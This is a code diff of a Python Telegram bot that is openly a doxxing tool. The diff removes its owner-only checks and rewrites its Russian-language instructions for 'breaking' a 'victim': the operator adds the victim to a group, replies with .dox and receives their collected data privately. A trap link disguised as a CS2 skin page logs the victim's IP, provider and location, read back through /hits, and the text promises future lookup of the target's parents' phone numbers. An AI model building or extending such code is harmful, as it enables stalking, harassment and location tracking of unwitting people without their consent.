@@ -68,21 +68,30 @@ def menu(tg, lk):
 
 @dp.message(Command("start"))
 async def start(m: Message):
-    if m.from_user.id != OWNER_ID:
-        await m.answer("—")
-        return
     await m.answer(
-        "👋 <b>Dox Helper</b>\n\n"
-        "Как юзать:\n"
-        "1. Добавь меня в чат с целью\n"
-        "2. Свайпни влево по её сообщению (Reply)\n"
-        "3. Напиши <code>.dox</code>"
+        "<b>▸ DOX</b>\n\n"
+        "Добро пожаловать. Это бот для пробива.\n"
+        "В будущем добавлю поиск номеров родителей и самой цели.\n\n"
+        "<b>▸ Как юзать</b>\n"
+        "1. Создай группу\n"
+        "2. Добавь туда жертву и этого бота\n"
+        "(по желанию — сделай бота админом)\n"
+        "3. Жертва пишет в группу любое сообщение — слово, знак, стикер, гифку\n"
+        "4. Ты <b>отвечаешь (reply)</b> на её сообщение и пишешь <code>.dox</code>\n"
+        "5. Бот присылает тебе в лс всё, что есть\n\n"
+        "<b>▸ Ловушка (IP + гео)</b>\n"
+        "• Готовишь ссылку-ловушку\n"
+        "• Даёшь жертве со словами «смотри какой скин хочу купить»\n"
+        "• Жертва открывает — видит скин из CS2\n"
+        "• Её IP, провайдер и местоположение уже в твоих руках\n"
+        "• Пишешь боту <code>/hits</code> — смотришь результат\n\n"
+        "<b>▸ Команды</b>\n"
+        "<code>.dox</code> — пробить цель (reply на её сообщение)\n"
+        "<code>/hits</code> — переходы по ловушке"
     )
 
 @dp.message(F.text.startswith(".dox"))
 async def dox_cmd(m: Message):
-    if m.from_user.id != OWNER_ID:
-        return
     target = m.reply_to_message.from_user if m.reply_to_message else m.from_user
     uid = target.id
     tg = await tg_data(uid)
@@ -92,27 +101,31 @@ async def dox_cmd(m: Message):
     except Exception:
         pass
     try:
-        await bot.send_message(OWNER_ID, menu(tg, lk), disable_web_page_preview=True)
+        await bot.send_message(m.from_user.id, menu(tg, lk), disable_web_page_preview=True)
     except Exception:
-        await m.answer("Напиши боту в личку /start")
+        await m.answer("Напиши боту в личку /start и повтори команду.")
 
 @dp.message(Command("hits"))
 async def hits_cmd(m: Message):
-    if m.from_user.id != OWNER_ID:
-        return
     try:
         r = requests.get(f"{TRAP_URL}/hits", timeout=15).json()
     except Exception as e:
         await m.answer(f"Ловушка не отвечает: {e}")
         return
     if not r:
-        await m.answer("Хитов пока нет.")
+        await m.answer(
+            "Хитов пока нет.\n\n"
+            "Кинь цели ссылку:\n"
+            f"<code>{TRAP_URL}/skin/имя_цели</code>"
+        )
         return
     lines = ["<b>▸ HITS</b> (последние 10)"]
     for h in r[-10:]:
+        uid = h.get('uid', '')
         lines.append(
             f"\n<b>{h.get('ts','')[:19]}</b>\n"
-            f"метка: <code>{h.get('uid','')}</code>\n"
+            f"метка: <code>{uid}</code>\n"
+            f"ссылка: <code>{TRAP_URL}/skin/{uid}</code>\n"
             f"IP: <code>{h.get('ip','')}</code>\n"
             f"город: {h.get('city','')}, {h.get('region','')}\n"
             f"страна: {h.get('country','')}\n"
@@ -125,7 +138,6 @@ async def on_contact(m: Message):
     if m.contact and m.contact.user_id:
         CONTACTS[m.contact.user_id] = m.contact.phone_number
 
-# ---- заглушка для Render Web Service ----
 web = Flask(__name__)
 
 @web.route("/")
